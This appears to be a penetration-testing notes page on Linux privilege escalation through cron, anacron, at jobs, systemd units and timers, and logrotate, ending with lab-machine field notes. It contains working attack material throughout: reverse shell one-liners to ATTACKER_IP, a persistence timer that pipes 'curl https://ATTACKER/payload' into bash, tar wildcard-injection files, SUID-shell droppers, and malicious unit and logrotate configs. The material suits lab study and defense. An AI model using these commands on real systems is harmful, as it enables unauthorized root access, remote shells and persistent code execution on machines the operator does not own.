+++
title = 'Programs, Jobs and Services'
date = 2026-10-30
type = 'notes'
weight = 50
toc = true
tags = ['linux', 'privilege-escalation', 'services', 'cron', 'systemd']
+++

Scheduled and supervised execution is the most consistent privilege-escalation surface on Linux. Root runs something on a timer, on boot, on log rotation, or on a process event — and if you can influence **what** it runs, **where** it runs it, or **how** it resolves it, you inherit root. This file covers every scheduler you will encounter: cron, anacron, `at`, systemd timers and units, transient `systemd-run` jobs, and logrotate.

---

## 1. Cron Job Abuse

> Scheduled jobs, typically used for administrative tasks — backups, cleanup, reporting. The `crontab` command creates a cron file that the cron daemon runs on the specified schedule.

Each entry requires five time fields followed by the command: `minute hour day-of-month month day-of-week command`.

**Example:** `0 3 * * 1 /usr/local/bin/backup.sh` runs every Monday at 03:00. The fifth field is **day-of-week** (0–7, both 0 and 7 are Sunday), not “weeks”.

### Where cron jobs live

| Location | Notes |
|---|---|
| `/etc/crontab` | System crontab; has an extra **user** field before the command |
| `/etc/cron.d/*` | Drop-in system jobs; same extra user field |
| `/etc/cron.{hourly,daily,weekly,monthly}/` | Scripts run by `run-parts`; the **directory** must be writable to add a job |
| `/var/spool/cron/crontabs/<user>` | Debian/Ubuntu per-user crontabs (note the `crontabs` subdirectory) |
| `/var/spool/cron/<user>` | RHEL/CentOS per-user crontabs |
| `crontab -l` / `crontab -e` | Current user’s jobs |

### Enumeration

```bash
# All cron locations
ls -la /etc/cron* /var/spool/cron /var/spool/cron/crontabs 2>/dev/null
cat /etc/crontab
ls -la /etc/cron.d/

# Current user's jobs
crontab -l

# Watch root jobs fire in real time without root
./pspy64 -pf -i 1000

# Cron execution logs
grep -i cron /var/log/syslog /var/log/cron 2>/dev/null
journalctl -u cron --no-pager

# Hidden entries — control characters can mask a line in casual output
cat -A /etc/crontab
```

For every job, check the **permissions and ownership of the script and of every directory in its path**. A writable script, a writable parent directory, or a writable file the script reads is enough.

```bash
# Trace the full path resolution of a cron-referenced script
namei -l /path/to/scheduled/script
```

### Exploiting writable cron scripts

If the cron script — or a file it sources — is writable, append a reverse shell. It runs as the cron user (usually root), so keep the payload compatible with `/bin/sh`.

```bash
echo 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1' >> /writable/cron-script.sh
```

If the **directory** is writable but the file is not, you can often replace the file entirely — check whether cron calls it by absolute path.

If the script’s directory is writable and cron calls the script by **relative name**, or a directory earlier in the cron `PATH` is writable, use the PATH hijack technique:

```bash
# If crontab contains PATH=/home/user:/usr/local/sbin:...
# and cron runs: backup.sh
# Plant /home/user/backup.sh with a payload
```

### Cron wildcard injection

This is the most common cron privilege escalation in labs. **Prerequisite:** a root cron job runs a command with a **wildcard** such as `tar`, `rsync`, `chown`, or `7z` inside a directory you can write to.

Example cron entry:

```bash
*/5 * * * * root cd /home/user/backup && tar czf /var/backups/backup.tar.gz *
```

GNU `tar` parses arguments anywhere on the command line, so files whose names look like options become options after the shell expands `*`:

```bash
cd /home/user/backup
echo '#!/bin/sh' > shell.sh
echo 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash' >> shell.sh
chmod +x shell.sh

touch -- '--checkpoint=1'
touch -- '--checkpoint-action=exec=sh shell.sh'
```

When cron runs, `tar` sees `--checkpoint=1 --checkpoint-action=exec=sh shell.sh` and executes `shell.sh` as root. Then run `/tmp/rootbash -p`.

**Other wildcard-injection candidates** — read the exact command before creating payload files:

| Command | Injection file names |
|---|---|
| `rsync` | `-e sh shell.sh` (remote-shell option) |
| `chown` | `--reference=FILE` (take another file’s owner/group) |
| `7z` / `zip` | Option-like filenames — verify the exact command line first |

> **Warning:** Wildcard injection only works if the wildcard is expanded by the shell in a directory you control, and the command accepts options **after** the wildcard. Use `--` to end option parsing in hardened jobs.

### Cron PATH hijack

If the cron `PATH` includes a writable directory and the job calls a command by bare name:

```bash
# 1. Confirm the cron PATH and the relative command
cat /etc/crontab | grep PATH
pspy64 -pf -i 1000          # watch the exact command line

# 2. Plant a malicious binary in the writable PATH directory
cat > /writable/path/binary <<'EOF'
#!/bin/sh
cp /bin/bash /tmp/rootbash
chmod +s /tmp/rootbash
EOF
chmod +x /writable/path/binary

# 3. After the job fires:
/tmp/rootbash -p
```

---

## 2. Anacron

Anacron runs daily, weekly, and monthly jobs on systems that are not continuously powered on. It is configured in **`/etc/anacrontab`** and should be enumerated alongside cron — it is frequently omitted from checklists.

### Enumeration

```bash
cat /etc/anacrontab 2>/dev/null
ls -la /var/spool/anacron/
```

### Exploitation

Anacron runs `run-parts` against `/etc/cron.daily`, `/etc/cron.weekly`, and `/etc/cron.monthly` when cron is absent — so the **same writable-script and writable-directory primitives apply**. A writable script in `/etc/cron.daily/` is an immediate root path, regardless of whether it is executed by cron or anacron.

```bash
ls -la /etc/cron.daily/ /etc/cron.weekly/ /etc/cron.monthly/
find /etc/cron.daily /etc/cron.weekly /etc/cron.monthly -writable -type f 2>/dev/null
```

---

## 3. `at` Jobs

`at` schedules one-shot commands. A root-scheduled `at` job that runs a script in a writable directory is exploitable exactly like a writable cron script — plant your payload and wait.

### Enumeration

```bash
atq                              # list queued jobs
at -l
ls -la /var/spool/cron/atjobs/ 2>/dev/null
```

### Exploitation

If `at` is permitted via `sudo` or an `at.allow` entry, you can queue a job that runs as root:

```bash
echo '/bin/bash -c "chmod u+s /bin/bash"' | sudo at now
/bin/bash -p
```

If a **root-owned `at` job** is discovered that runs a script in a writable directory:

```bash
# Wait for the job to fire, or inspect /var/spool/cron/atjobs for the command
cat /var/spool/cron/atjobs/* 2>/dev/null
# Plant your payload at the referenced script path
```

> **Note:** `at` jobs are one-shot. Unlike cron, you cannot wait for the next interval — you must either queue a new job (with sudo) or time your payload before the existing job fires.

---

## 4. Systemd Timers and Units

Systemd is PID 1 on nearly every modern distribution, and anything that influences what systemd executes is a direct path to root. Timers are the modern replacement for cron and are frequently overlooked.

### Unit-file precedence

systemd reads unit files from highest to lowest precedence:

```
/etc/systemd/system/        # admin-defined units (highest priority)
/run/systemd/system/        # runtime-generated units
/usr/lib/systemd/system/    # distro/package-shipped units
```

A writable unit in `/etc/systemd/system/` overrides the package version in `/usr/lib/systemd/system/` — which is why a writable drop-in or a writable unit file is a reliable escalation.

### Enumeration

```bash
# All timers, including inactive
systemctl list-timers --all

# Running services
systemctl list-units --type=service --state=running

# Writable unit files and drop-ins
find /etc/systemd/system /lib/systemd/system /usr/lib/systemd/system \
  -type f \( -name '*.service' -o -name '*.timer' \) -writable 2>/dev/null

find /etc/systemd/system -type d -name '*.d' -writable 2>/dev/null

# What a unit actually executes
systemctl cat <unit>
systemctl show <unit> -p User -p ExecStart -p ExecStartPre -p ExecStartPost \
  -p ExecReload -p WorkingDirectory -p EnvironmentFiles

# systemctl permissions via sudo or polkit
sudo -l | grep -i systemctl
```

Key directives to attack: `ExecStart=`, `ExecStartPre=`, `ExecStartPost=`, `ExecReload=`, `WorkingDirectory=`, `EnvironmentFile=`, `User=`.

### Exploiting a writable unit file

If `/etc/systemd/system/vulnsvc.service` is writable, overwrite `ExecStart` with a payload that drops a SUID shell:

```ini
[Unit]
Description=Vulnerable demo service

[Service]
Type=oneshot
ExecStart=/bin/bash -c 'cp /bin/bash /tmp/rootbash; chmod 4755 /tmp/rootbash'

[Install]
WantedBy=multi-user.target
```

Trigger the unit:

```bash
systemctl daemon-reload
systemctl restart vulnsvc.service
# or start it if it is not running
systemctl start vulnsvc.service

# Cash in:
/tmp/rootbash -p
```

If you do **not** have `systemctl` rights, wait for a natural trigger — a reboot, a dependent target, or a **timer** that calls the writable service.

### Exploiting a writable `ExecStart` binary

A unit can be perfectly locked down while pointing at a **world-writable script**:

```bash
# Find ExecStart targets that are writable
grep -rH 'ExecStart' /etc/systemd/system/ /usr/lib/systemd/system/ 2>/dev/null \
  | awk -F'=' '{print $2}' | awk '{print $1}' | sort -u
# Check permissions on each
ls -la /path/to/execstart/target
```

If writable, replace the script with a payload — no unit edit required.

### Timer → service chains

A timer may activate a service with a **different name** through its `Unit=` directive:

```bash
systemctl cat <name>.timer <name>.service
systemctl show <name>.timer -p Unit
```

If the timer points at a writable service, the timer is the trigger and the service is the payload host.

### Transient units — `systemd-run` / `run0`

If you have `CAP_SYS_ADMIN` or a polkit rule allowing it, `systemd-run` starts a **transient unit** as root:

```bash
systemd-run --unit=evil --uid=0 /bin/bash -c 'chmod u+s /bin/bash'
/bin/bash -p
```

`run0` (systemd’s sudo replacement) uses the same transient-unit mechanism. A permissive polkit rule for `org.freedesktop.systemd1.manage-units` is a direct root path.

### User-level timers for persistence

Even without root, a user timer survives logout via `loginctl enable-linger`:

```bash
mkdir -p ~/.config/systemd/user
cat > ~/.config/systemd/user/beacon.service <<'EOF'
[Service]
ExecStart=/bin/bash -c 'curl -s https://ATTACKER/payload | bash'
EOF
cat > ~/.config/systemd/user/beacon.timer <<'EOF'
[Timer]
OnBootSec=2min
OnUnitActiveSec=10min
[Install]
WantedBy=timers.target
EOF
systemctl --user enable --now beacon.timer
loginctl enable-linger "$USER"
```

> **Note:** This is persistence, not privilege escalation — the timer runs as you. It becomes privilege escalation only if a root service later sources the user unit or if `loginctl enable-linger` is combined with another misconfiguration.

### Relevant systemd CVEs

- **CVE-2025-2515** — BlueChi multi-node systemd controller: a user with root on a **managed node** can create or override unit files that affect the **host node**.
- **CVE-2025-9074** — Docker Desktop API (adjacent, but relevant when systemd units manage container runtimes).

---

## 5. Logrotate Abuse

Logrotate runs as root (typically from cron) and executes `firstaction` / `lastaction` / `postrotate` directives from configuration files. A writable config or a writable log directory is a root-execution primitive.

### Enumeration

```bash
ls -la /etc/logrotate.conf /etc/logrotate.d/
find /etc/logrotate.d -writable 2>/dev/null

# Confirm logrotate is cron-driven
pspy64 -pf -i 1000
grep -i logrotate /etc/crontab /etc/cron.d/* 2>/dev/null
```

### Writable config — direct root execution

If `/etc/logrotate.d/` is writable, append a block that runs a command:

```
/tmp/whatever {
    daily
    firstaction
        chmod u+s /bin/bash
    endscript
}
```

Wait for the daily cron (or trigger logrotate if permitted).

### LogRotten — symlink race

**Prerequisites:** logrotate runs as root, and the **log directory** is writable (not necessarily the config).

**Vulnerable versions:** `3.8.6`, `3.11.0`, `3.15.0`, `3.18.0`.

```bash
git clone https://github.com/whotwagner/logrotten.git
gcc logrotten.c -o logrotten

echo 'bash -i >& /dev/tcp/ATTACKER_IP/9001 0>&1' > payload

# Determine whether the config uses create or compress
grep "create\|compress" /etc/logrotate.conf | grep -v "#"

# Create:
./logrotten -p ./payload /tmp/log/pwnme.log
# Compress:
./logrotten -p ./payload -c -s 4 /tmp/log/pwnme.log
```

Wait for the rotation; the symlink race redirects the rotated file to a root-owned path, and the payload runs as root. Sometimes you must write to the logfile (add a blank space) to trigger the rotation.

### 2025 logrotate CVEs (openSUSE Tumbleweed)

| CVE | Package | Primitive |
|---|---|---|
| **CVE-2025-53881** | `exim` | Symlink-following in the logrotate config allows escalation from `mail` user/group to root. The `postrotate` scripts run with full root privileges even when `su mail mail` is present in the config. |
| **CVE-2025-53882** | `mailman3` | Improper check for dropped privileges — the `mailman` user can create files **as root**, enabling privilege escalation. |

```bash
rpm -qa | grep -E 'exim|mailman3' 2>/dev/null
rpm -qi exim 2>/dev/null | grep -i version
```

> **Note:** These are package-configuration flaws, not logrotate-core bugs — but they are reliable on the affected openSUSE releases. The generic writable-config and LogRotten primitives apply everywhere.

---

## Field Notes from the HTB List

- **inotify triggers count as cron.** A root `malwarescan.sh` watching `shrunk/` with `inotifywait` runs when you drop a file — look for the watcher, not a crontab (Pilgrimage).
- **Race conditions are a real technique.** TartarSauce’s `backuperer` sleeps 30 seconds between creating and extracting an archive; swap it during the window. A SUID payload inside the archive must preserve the `var/www/html` tree or `diff` exits non-zero and the extraction is deleted.
- **Injection through file names.** `exec("... rm -f $path$value")` with a user-controlled upload name gives command execution as the web user (Networked). Same class: `for f in *.py` in a writable directory (Bashed).
- **Read the current working directory.** `sudo /opt/full-checkup.sh` runs relative paths from the caller’s CWD — plant the binary it calls (Busqueda). A `sudo` script ending in `./something` is the same bug.
- **SUID `systemctl`** needs the unit in `/dev/shm`; `systemctl link` from `/tmp` fails on path resolution (Jarvis).
- **Unquoted comparisons accept `*`.** `if [[ $DB_PASS == $USER_PASS ]]` matches any password when you enter `*`; then `pspy` catches the real password on the `mysqldump` command line (Codify).

Full context: [HTB Linux machines](/notes/oscp-labs/linux/).
